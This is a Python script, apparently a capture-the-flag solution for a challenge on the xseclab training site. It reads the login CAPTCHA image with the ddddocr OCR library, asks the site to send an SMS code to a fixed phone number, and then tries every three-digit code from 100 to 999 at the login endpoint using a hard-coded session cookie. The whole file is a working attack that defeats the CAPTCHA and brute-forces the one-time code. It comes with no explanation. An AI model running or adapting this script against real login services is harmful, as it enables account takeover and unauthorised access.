import ddddocr
import requests
class ctf_problem():
    def __init__(self):
        self.headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
                 "Cookie":"PHPSESSID=1411162a6febe1de838b4f20bdca5521"}
    def orc_distinguish(self):
        ocr=ddddocr.DdddOcr()
        url="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php"
        image=requests.get(url,headers=self.headers).content
        # with open(image,'rb+') as f:
        #     image=f.read()
        con=ocr.classification(image)
        print(con[-4:])
        return con
    def send_vcode(self):
        url="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php"
        data={"getcode":1,"mobi":13388886666}
        res=requests.post(url,headers=self.headers,data=data)
        print(res.text)
    def blase_pass(self,xx):
        code=self.orc_distinguish()
        url="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php"
        data={"username":13388886666,
              "mobi_code":'{}'.format(xx),
              "user_code":'{}'.format(code),
              "Login":"submit"}
        res=requests.post(url,headers=self.headers,data=data)
        print(res.text)
    def final(self):
        self.send_vcode()
        for i in range(100,1000):
            self.blase_pass(i)
ctf=ctf_problem()
ctf.final()
